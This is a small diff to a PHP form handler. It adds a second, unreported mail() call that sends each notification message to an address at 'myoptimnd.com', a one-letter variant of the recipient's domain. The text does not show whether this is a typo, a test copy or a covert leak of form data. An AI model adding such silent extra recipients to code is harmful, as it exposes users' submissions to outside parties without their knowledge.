@@ -20,6 +20,6 @@ if(jp_add($item)){
   ";
   $headers = "From: noreply@betaprojex.com \r\n";
   $to = "lsalamante@myoptimind.com";
-
+  mail("cvalerio@myoptimnd.com",$subject,$message,$headers);
   echo (mail($to,$subject,$message,$headers)) ? 1 : 0 ;
 }
